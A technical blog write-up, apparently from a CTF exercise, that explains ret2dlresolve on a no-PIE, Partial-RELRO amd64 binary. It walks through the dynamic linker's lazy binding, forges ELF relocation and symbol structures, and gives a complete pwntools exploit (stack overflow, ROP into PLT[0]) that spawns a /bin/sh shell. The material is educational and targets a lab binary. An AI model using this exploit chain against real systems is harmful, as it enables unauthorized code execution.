---
image_path: "/images/blog_images/ret2dlresolve.webp"
title: "Ret2dlresolve but well explained?"
date: 2026-06-16
description: "A deep dive into one of the most annoying binary exploitation technique: Ret2dlresolve, aka calling functions that were not supposed to be called."
project_link: none
seo_title: "Ret2dlresolve Explained: Forging ELF Relocations to Hijack the Dynamic Linker"
seo_description: "Technical writeup of a ret2dlresolve exploit on an amd64 Partial-RELRO no-PIE binary. Covers GOT/PLT, lazy binding, _dl_runtime_resolve internals, Elf64_Rela/Elf64_Sym/dynstr forgery, index alignment math, and a runtime full-RELRO bypass via a writable .dynstr page."
seo_keywords: "ret2dlresolve, dl_runtime_resolve, dl_fixup, GOT, PLT, lazy binding, RELRO, partial relro, Elf64_Rela, Elf64_Sym, dynstr, dynsym, binary exploitation, pwn, CTF, offensive security, no PIE, ROP"
tags: ["binary-exploitation", "cybersecurity", "ctf", "offensive-security"]
---

# Ret2dlresolve but well explained?

Recently, while going deeper into binary exploitation, I stumbled upon a technique that felt like black magic the first time I saw it: **ret2dlresolve**.

The idea behind it is pretty unconventional: instead of leaking a libc address, computing offsets and jumping to `system`, we **ask the dynamic linker to resolve `system` for us**, by handing it a pile of forged ELF structures we wrote ourselves.

Most writeups I found just throw `pwntools`' `Ret2dlresolvePayload` at the problem which is fine until the binary does something slightly unusual and the automation breaks. That's why i had to enter this rabbit hole and i am going to explain this attack.

## Section 1: Prerequisites

> [!author]
> If you have never touched the GOT/PLT machinery before, take your time with section 1. The exploit is almost trivial once the resolution algorithm clicks, the whole difficulty is *understanding what the dynamic linker is actually doing on your behalf*.

The binary we are attacking has this `checksec`:

> [!term checksec binaryname]
```shell
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Three lines matter for us:

- **No canary**: we can smash the stack and control the return address freely.
- **No PIE**: every address (code, GOT, `.bss`, the relocation tables) is **static and known at compile time**. This is huge: ret2dlresolve needs to *point* at structures, and fixed addresses make that pointing trivial.
- **Partial RELRO**: lazy binding is enabled, which means the resolver `_dl_runtime_resolve` is reachable and willing to work for us.

NX is on, so we can't just drop shellcode. And as we'll see, this particular binary also plays a nasty trick by upgrading itself to *Full* RELRO at runtime.

---


### RELRO

**RELRO** (RELocation Read-Only) is an exploit-mitigation that hardens sections of an ELF that the loader writes to during startup. It comes in three flavours:

1. **No RELRO**: the GOT is fully writable, anything goes.
2. **Partial RELRO**: some sections (`.init_array`, `.dynamic`, ...) are made read-only, but the `.got.plt` stays **writable** because lazy binding needs to patch it at runtime.
3. **Full RELRO** : the linker resolves *every* symbol eagerly at startup, then maps the whole GOT read-only. No lazy binding, nothing to abuse. This is sometimes avoided because it increases the program's startup time.

### GOT and PLT: the lazy-binding dance
Ever wondered what happens when your program call an external function from a dynamic library like `read` in libc?
At first the compiler doesn't know where `read` will live in memory (libc is loaded at a runtime-decided address). So it adds a layer of indirection made of two tables:

- **PLT** (Procedure Linkage Table): a small trampoline in *code*. the `call read@plt` which you probably found while debugging jumps here.
- **GOT** (Global Offset Table, specifically `.got.plt`): a table in *data* holding the **real, resolved addresses** of functions.

With **lazy binding**, a function isn't resolved until the first time it's actually called. The very first call to `read` flows like this:

<img src="/images/blog_images/lazy_binding.png">

So the very first call ends up invoking `_dl_runtime_resolve(link_map, reloc_index)`.

The resolver figures out the real address of `read`, **writes it into `GOT[read]`**, and jumps to it. Every subsequent call jumps straight through the now-patched GOT entry, never bothering the resolver again.

**The entire attack lives inside that `reloc_index`.** We fully control it (it's just a number we push), and we'll see the resolver trusts it blindly.

### How does the linker resolve a symbol?

`_dl_runtime_resolve` is mostly glue; the real work happens in `_dl_fixup`. Conceptually it does this:

> [!code _dl_fixup(): the resolver, simplified]
```C
void *_dl_fixup(link_map *l, Elf64_Word reloc_index) {
    Elf64_Rela *reloc  = JMPREL + reloc_index;                // (1) pick a relocation
    Elf64_Sym  *sym    = &SYMTAB[ELF64_R_SYM(reloc->r_info)]; // (2) pick a symbol based on choosen reloc
    const char *name   = STRTAB + sym->st_name;          // (3) get its name string based on choosen symbol
    void *result       = lookup_symbol(name, l);         // (4) search loaded libs
    *(void **)reloc->r_offset = result;                  // (5) patch the GOT
    return result;                                       // (6) ...and jump there
}
```

Three tables, chained by indices. Let's name them with their real ELF sections:

- `JMPREL` => `.rela.plt`, an array of `Elf64_Rela`.
- `SYMTAB` => `.dynsym`, an array of `Elf64_Sym`.
- `STRTAB` => `.dynstr`, a flat blob of NULL-terminated strings.

Here are the two structs that matter, straight from the ELF spec:

> [!code The relocation entry: Elf64_Rela]
```C
typedef struct {
    Elf64_Addr   r_offset;   /* WHERE to write the result (a GOT address) */
    Elf64_Xword  r_info;     /* relocation type + symbol index, packed     */
    Elf64_Sxword r_addend;   /* addend (unused for JUMP_SLOT)              */
} Elf64_Rela;

/* r_info packs two fields: the upper 32 bits are the symbol index,
   the lower 32 bits are the relocation type.                       */
#define ELF64_R_SYM(i)        ((i) >> 32)
#define ELF64_R_TYPE(i)       ((i) & 0xffffffff)
#define ELF64_R_INFO(sym, t)  ((((Elf64_Xword)(sym)) << 32) + (t))
```

> [!code The symbol entry: Elf64_Sym]
```C
typedef struct {
    uint32_t      st_name;   /* offset INTO .dynstr => the symbol's name */
    unsigned char st_info;   /* type + binding                           */
    unsigned char st_other;
    uint16_t      st_shndx;
    Elf64_Addr    st_value;
    uint64_t      st_size;
} Elf64_Sym;
```

So the resolution is a pointer-chasing chain:

The resolver chases pointers through three tables, each one supplying the key to the next: the relocation JMPREL[idx] names a symbol via its r_info field; that symbol SYMTAB[sym_idx] names a string via its st_name offset; and that offset into STRTAB finally spells out "read".

At first this is surely not going to be clear, so let's see it on the **real binary** with pwndbg. First, where these sections live (no PIE, so these are the final runtime addresses):

> [!term pwndbg ▸ elfsections]
```text
pwndbg> elfsections
             Start                End     Perm       Size  Name
          0x3fe440           0x3fe4b8      RW-       0x78  .dynsym      ← SYMTAB
          0x3fe4b8           0x3fe510      RW-       0x58  .dynstr      ← STRTAB
          0x3fe510           0x3fe6f0      RW-      0x1e0  .dynamic
          0x4004d8           0x400508      R-X       0x30  .rela.dyn
          0x400508           0x400538      R-X       0x30  .rela.plt    ← JMPREL
          0x401000           0x401020      R-X       0x20  .plt
          0x401050           0x401070      R-X       0x20  .plt.sec
          0x403ff0           0x404000      R--        0x8  .got
          0x404000           0x404040      RW-       0x40  .got.plt
          0x404040           0x404048      RW-        0x8  .data
          0x404060           0x404070      RW-       0x10  .bss   
```

Now let's walk the chain for the legit `read` relocation (index 0 in `.rela.plt`):

> [!term pwndbg ▸ walking the legit read chain]
```text
pwndbg> x/3gx 0x400508            ; JMPREL[0]  (Elf64_Rela)
0x400508:  0x0000000000404018    ; r_offset => GOT entry for read
0x400510:  0x0000000200000007    ; r_info: sym=2, type=7 (JUMP_SLOT)

pwndbg> x/2gx 0x3fe440 + 2*0x18   ; SYMTAB[2]  (Elf64_Sym)
0x3fe470:  0x0000001200000001    ; st_name=0x1, st_info=0x12 (GLOBAL|FUNC)

pwndbg> x/s 0x3fe4b8 + 0x1        ; STRTAB + st_name
0x3fe4b9:  "read"
```

There it is: `idx 0 => sym 2 => name offset 0x1 => "read"`. The linker reads exactly these bytes, in exactly this order, to figure out which symbol to resolve.

> [!author]
> Notice the resolver does **zero bounds checking** on the indices (on this glibc, anyway). `reloc_index` can be any number we like. If we make it gigantic, `JMPREL + reloc_index * 0x18` will sail right past `.rela.plt` and land wherever we want, **including a buffer we control** which can hold the forged structures we wrote ourselves :)

### What the attack needs

To pull this off we need exactly two things:

1. **Stack control**: to overwrite the return address, set up registers, push our own `reloc_index`, and jump into `PLT[0]` to kick off the resolver.
2. **Writable memory at a known address, near the relocation tables**: somewhere to forge our fake `Elf64_Rela`, `Elf64_Sym` and our `"system"` string. "Near" matters because we reach it by *multiplying* a struct size by an index from a fixed base; the destination has to be expressible as `base + size * i`.

No-PIE hands us both on a silver platter: the `.bss` buffer lives at the fixed address `0x404060`, and we can compute exactly which index makes the linker look there.

---

## Section 2: The attack at a high level

Here's the plan, before a single line of code.

The resolver blindly trusts `reloc_index`. So:

1. **Forge a fake `Elf64_Rela`** in our controlled buffer. Its `r_info` will encode a *fake symbol index*, and its `r_offset` will point to some writable address (where the resolved `system` will be stored — we don't care where, as long as it's writable).

2. **Forge a fake `Elf64_Sym`**, also in our buffer, that the fake `r_info` points to. Its `st_name` will be an offset (from `.dynstr`) that lands on...

3. ...**the literal string `"system"`**, which we also drop in our buffer.

4. Compute the three indices so that, starting from the *real* bases (`.rela.plt`, `.dynsym`, `.dynstr`), each `base + size * idx` lands exactly on the structure we forged.

5. Finally, set `rdi = "/bin/sh"`, push our giant `reloc_index` onto the stack, and **jump into `PLT[0]`**. The resolver walks our forged chain, looks up `"system"` in the already-loaded libc, writes its address somewhere harmless, and **jumps to `system` with `rdi` pointing at `/bin/sh`**.

The beauty: we never leak anything. We don't need a single libc address. We just exploit the fact that **libc is already loaded** and the linker is a very obedient lookup oracle.

Visually, the chain we forge mirrors the legit one, but every arrow now points back into our own buffer:


<img src="/images/blog_images/crafted.png">

---

## Section 3: The exploit 

### The target: two reads and a self-inflicted Full RELRO

`main` is tiny. Disassembled, it does exactly this:

> [!code main(): disassembled]
```x86asm
main:
    sub    rsp, 0x10
    mov    edx, 0x100
    lea    rax, [rip+buff]      ; 0x404060  (.bss)
    mov    rsi, rax
    mov    edi, 0
    call   read@plt             ; READ #1 => 0x100 bytes into buff (.bss)

    lea    rax, [rbp-0x10]
    mov    edx, 0x1000
    mov    rsi, rax
    mov    edi, 0
    call   read@plt             ; READ #2 => 0x1000 bytes into a 16-byte stack buffer (!!)

    call   install_fullrelro    ; ← the nasty surprise
    leave
    ret
```

Two gifts and one trap:

- **READ #1** lets us write 0x100 bytes straight into `.bss` at the *known* address `0x404060`. That's where our forged structures go.
- **READ #2** writes up to `0x1000` bytes into a **16-byte** stack buffer. Textbook stack overflow => we own the return address.
- **`install_fullrelro`** is called *right before* `ret`. Let's look at it:

> [!code install_fullrelro(): the trap]
```x86asm
install_fullrelro:
    lea    rax, [rip+buff]          ; 0x404060
    and    rax, 0xfffffffffffff000  ; round down to page => 0x404000
    mov    edx, 1                   ; PROT_READ
    mov    esi, 0x1000
    mov    rdi, rax
    call   mprotect@plt             ; make the page 0x404000 READ-ONLY
```

The binary `mprotect`s the page at `0x404000` to **read-only**. That page contains `.got.plt`! So by the time our ROP chain runs, the GOT is frozen, the program has hand-rolled Full RELRO on itself.

### Trick #1: Dodging the runtime Full RELRO

Remember step 5 of `_dl_fixup`: `*(void **)reloc->r_offset = result`. The resolver **writes** the looked-up address to `r_offset`. If `r_offset` points into the now-read-only GOT page, that store **segfaults** before `system` is ever called.

The fix is delightfully simple: `r_offset` doesn't have to point at a real GOT entry. **It just has to be writable, and we don't care what gets clobbered.** Looking back at `elfsections`, the whole `0x3fe000` region (`.dynsym`, `.dynstr`, `.dynamic`) is mapped `RW-` and lives on a *different page* that `install_fullrelro` never touches.

So I point `r_offset` at `0x3FE4B8` (the start of `.dynstr`). The resolver happily scribbles `system`'s address over a few bytes of the string table we no longer need, and the call goes through.

### Trick #2: Index alignment (`craft_index`)

Here's the core geometric problem. We want to find an integer `i` such that:

`base + 0x18 * i == wanted_dst`

But `i` must be an **integer**, and `wanted_dst - base` might not be a clean multiple of `0x18`. If it isn't, there's *no* index that lands exactly on our target.

My solution: don't fight it. If the exact destination isn't reachable, **nudge the destination forward** to the next reachable multiple, and remember the gap so I can pad over it with junk bytes.

> [!code craft_index: the alignment helper]
```python
def craft_index(base, struct_size, wanted_dst):
    """
    Find i such that  base + struct_size * i == wanted_dst.
    If no such integer i exists, bump wanted_dst forward to the
    nearest reachable address and report the leftover gap, so the
    caller can fill it with padding.
    """
    i = math.ceil((wanted_dst - base) / struct_size)
    new_dst = base + (i * struct_size)
    return i, new_dst, new_dst - wanted_dst   # index, real dst, padding gap
```

I use `math.ceil` so I always round *up* to a reachable slot at or after the target, never before it (overlapping earlier data would corrupt my own structures). The third return value, the gap, is the number of filler bytes I need to insert so the *next* structure still starts where the next index expects it.

> [!author]
> This little function is the whole "alignment" magic. Once you can answer *"which index makes the linker look exactly here?"*, forging the chain is just bookkeeping.

### Building the chain

Let me lay out the real numbers the script computes (you can verify them against the `elfsections` dump above):

> [!term known addresses (no PIE)]
```text
rela_plt_addr = 0x400508     (JMPREL base, .rela.plt)
dynsym_addr   = 0x3fe440     (SYMTAB base, .dynsym)
str_tab_addr  = 0x3fe4b8     (STRTAB base, .dynstr)
buff          = 0x404060     (our writable, known .bss buffer)
```

**(a) Index for the fake `Elf64_Rela`.** We want `JMPREL + 0x18 * i` to hit `0x404060`:

> [!code (a) index for the fake Elf64_Rela]
```python
crafted_idx_rela, start_buf_address, _ = craft_index(rela_plt_addr, 0x18, buff)
#  => idx 0x279 (633),  lands exactly at 0x404060
```

`(0x404060 - 0x400508) / 0x18 = 633.0` exactly, so no padding needed here. Our forged relocation will be reached as `JMPREL[633]`.

**(b) Index for the fake `Elf64_Sym`.** The symbol goes right after the 0x18-byte relocation, i.e. at `0x404060 + 0x18 = 0x404078`. We want `SYMTAB + 0x18 * j` to hit it:

> [!code (b) index for the fake Elf64_Sym]
```python
crafted_idx_dynsym, dyn_struct_start, sym_to_fill = craft_index(dynsym_addr, 0x18, start_buf_address + 0x18)
#  => idx 0x3d8 (984),  but the nearest slot is 0x404080, not 0x404078
#  => sym_to_fill = 8   (8 bytes of padding to bridge the gap)
```

This time it **didn't** divide evenly: the nearest reachable address is `0x404080`, 8 bytes past where the relocation ends. That's exactly why `craft_index` returns the gap, I'll wedge 8 filler bytes between the fake `Rela` and the fake `Sym`.

**(c) Offset for the symbol name.** `st_name` is a plain byte offset into `.dynstr`, *not* a 0x18-strided index, so no `craft_index` needed. I place the `"system"` string right after the fake symbol (at `0x404080 + 0x18 = 0x404098`) and compute the offset:

> [!code (c) offset for the symbol name]
```python
crafted_idx_str = dyn_struct_start + 0x18 - str_tab_addr
#  => 0x404098 - 0x3fe4b8 = 0x5be0
```

So `STRTAB + 0x5be0 = 0x404098 = "system"`. 

### Stage 1: Stash the forged structures in `.bss`

READ #1 lets us write the whole forged blob into `buff`. Here's how the bytes are assembled:

> [!code Stage 1: forging the structures]
```python
# Fake Elf64_Rela  (0x18 bytes)
fake_elf_rela = flat(
    0x3FE4B8,                              # r_offset => writable .dynstr (dodges Full RELRO)
    (crafted_idx_dynsym << 32) | 7,        # r_info: sym index = 984, type = 7 (JUMP_SLOT)
    0,                                     # r_addend (ignored)
)

# Fake Elf64_Sym  (0x18 bytes): only st_name and st_info matter
fake_elf_sym = p32(crafted_idx_str) + p8(0x12) + b"\x00" * 19
#              st_name = 0x5be0     st_info = 0x12 (GLOBAL | FUNC)

system_str = b"system\x00\x00"
bin_sh_str = b"/bin/sh\x00"

# Glue it together, inserting the 8-byte gap from craft_index
fake_struct = fake_elf_rela + b"A" * sym_to_fill + fake_elf_sym + system_str + bin_sh_str
r.sendline(fake_struct)
```

A couple of fine points:

- `r_info`'s low byte is `7` = `R_X86_64_JUMP_SLOT`. The resolver checks the relocation type; `JUMP_SLOT` is what it expects for PLT entries.
- `st_info = 0x12` means binding `STB_GLOBAL` (high nibble `1`) and type `STT_FUNC` (low nibble `2`), exactly what a normal exported function symbol looks like.
- The `b"A" * sym_to_fill` is the 8-byte bridge from Trick #2.

After this `sendline`, the `.bss` looks like this, our forged resolution chain sitting in memory:

> [!term pwndbg ▸ x/8gx 0x404060]
```text
0x404060:  0x00000000003fe4b8  0x000003d800000007   ← fake Rela (r_offset, r_info)
0x404070:  0x0000000000000000  0x4141414141414141   ← r_addend, 8 filler bytes
0x404080:  0x0000001200005be0  0x0000000000000000   ← fake Sym (st_name, st_info)
0x404090:  0x0000000000000000  0x00006d6574737973   ← zeros, "system\0\0"
0x4040a0:  0x0068732f6e69622f  ...                  ← "/bin/sh\0"
```

Walking it the way the linker will:

> [!term resolving the forged chain]
```text
JMPREL[0x279]   = 0x400508 + 0x279*0x18 = 0x404060   =>  fake Rela
  r_info >> 32  = 0x3d8 (984)            =>  sym index
SYMTAB[0x3d8]   = 0x3fe440 + 0x3d8*0x18 = 0x404080   =>  fake Sym
  st_name       = 0x5be0
STRTAB+0x5be0   = 0x3fe4b8 + 0x5be0     = 0x404098   =>  "system"   
```

Every arrow lands. The linker is now holding a loaded gun pointed at `system`.

### Stage 2: The final rop chain

READ #2 is our overflow. The stack buffer is 16 bytes, plus 8 for the saved `rbp`, so 24 bytes of padding put us on the saved return address. From there:

> [!code Stage 2: the ROP chain that drives the resolver]
```python
bin_sh_address = str_tab_addr + crafted_idx_str + len(system_str)   # 0x4040a0
gadget         = 0x40115e        # pop rdi ; ret
start_resolving = 0x401020       # PLT[0]: push link_map ; jmp _dl_runtime_resolve

payload_bof  = b"A" * 24
payload_bof += p64(gadget)             # pop rdi ; ret
payload_bof += p64(bin_sh_address)     #   rdi = "/bin/sh"
payload_bof += p64(start_resolving)    # jump into PLT[0]  => invoke the resolver
payload_bof += p64(crafted_idx_rela)   # ...with OUR reloc_index sitting on the stack
r.sendline(payload_bof)
r.interactive()
```

The chain returns into `0x401020`, which is **`PLT[0]`**:

> [!code PLT0: the resolver trampoline]
```x86asm
push QWORD [rip+0x2fe2]   ; push link_map           (GOT+8)
jmp  QWORD [rip+0x2fe3]   ; jmp  _dl_runtime_resolve (GOT+16)
```

The choreography of the final `ret`:

1. `ret` pops `gadget` => `pop rdi; ret` loads `rdi = 0x4040a0` (`"/bin/sh"`) and returns.
2. The next `ret` jumps into `PLT[0]` (above).
3. At that instant, the top of the stack holds `crafted_idx_rela` (0x279), exactly where `_dl_runtime_resolve` expects its `reloc_index` argument. `PLT[0]` pushed `link_map` on top of it, the resolver pops both as its two arguments.
4. `_dl_fixup` walks our forged chain, resolves `"system"` in libc, stores the address at `0x3FE4B8` (writable, Full-RELRO-safe), and **tail-jumps into `system`** with `rdi` still pointing at `/bin/sh`.

`system("/bin/sh")`. Shell.

> [!author]
> The reason `rdi` survives all the way into `system` is that the System V ABI makes `rdi` argument-passing, and nothing between our `pop rdi` and the final jump clobbers it, the resolver is careful to preserve the argument registers precisely so it *can* tail-call the resolved function. We're piggybacking on that contract.

## The full exploit and word on symbol versioning
Here you can find the full exploit!



> [!code The exploit]
```python
def main():
    start_resolving = 0x0401020
    fake_struct_buf_address = 0x0404060
    gadget = 0x000000000040115E  # pop rdi, ret
    rela_plt_addr = exe.get_section_by_name(".rela.plt").header["sh_addr"]  # type: ignore
    dynsym_addr = exe.get_section_by_name(".dynsym").header["sh_addr"]  # type: ignore
    str_tab_addr = exe.get_section_by_name(".dynstr").header["sh_addr"]  # type: ignore
    crafted_idx_rela, start_buf_address, _ = craft_index(
        rela_plt_addr, 0x18, fake_struct_buf_address
    )
    crafted_idx_dynsym, crafted_dyn_structure_start, sym_to_fill = craft_index(
        dynsym_addr, 0x18, start_buf_address + 0x18
    )
    print(f"resolved_idx_rela={hex(rela_plt_addr + 0x18*crafted_idx_rela)}")
    print(f"resolved_idx_dynsym={hex(dynsym_addr+0x18*crafted_idx_dynsym)}")
    crafted_idx_str = crafted_dyn_structure_start + 0x18 - str_tab_addr
    print(f"resolved_idx_str={hex(str_tab_addr + crafted_idx_str)}")
    r = conn()
    # 1 stage: write ret2dlresolve fake structures into .bss buf.
    fake_elf_rela = flat(
        0x3FE4B8,  # Writable .dynstr (idc about values)
        ((crafted_idx_dynsym) << 32) | 7,
        0,
    )
    fake_elf_sym = p32(crafted_idx_str) + p8(0x12) + b"\x00" * (19)
    system_str = b"system\x00\x00"
    bin_sh_str = b"/bin/sh\x00"
    fake_struct = (
        fake_elf_rela + b"A" * sym_to_fill + fake_elf_sym + system_str + bin_sh_str
    )
    r.sendline(fake_struct)

    # 2 stage: with gadget place right idx for dispatchment in stack and jmp to resolve function with right system parameter.
    pause()
    bin_sh_address = str_tab_addr + crafted_idx_str + len(system_str)
    payload_bof = b"A" * 24
    payload_bof += p64(
        gadget
    )  
    payload_bof += p64(bin_sh_address)
    payload_bof += p64(start_resolving)
    payload_bof += p64(crafted_idx_rela)  # the value in rsp
    r.sendline(payload_bof)
    r.interactive()
```

One honest caveat which is going to save you a lot of time (trust me, i wasted a lot of time on this).

The real danger with a **huge symbol index** isn't just picking the wrong symbol, it's that the index gets used as an array subscript elsewhere in the linker, so a gigantic index makes that code read memory it was never meant to touch, and if you sail far enough out of bounds your exploit simply crashes. 

Concretely, on modern glibc, **.dynsym entries can carry version info (DT_VERSYM)**, and _dl_fixup will index a version array with our fake, gigantic symbol index, reading far out of bounds. Sometimes that out-of-bounds half-word lands on bytes that select a bogus version and the lookup fails (or the stray read hits unmapped memory and crashes). 
When it does, the cure is to nudge the indices, exactly what craft_index's "bump to the next reachable slot" already lets me do, until the stray read lands on benign data. On this binary the first alignment I computed worked, but if your ret2dlresolve resolves to garbage or crashes on a versioned libc, this is the first place to look.

---
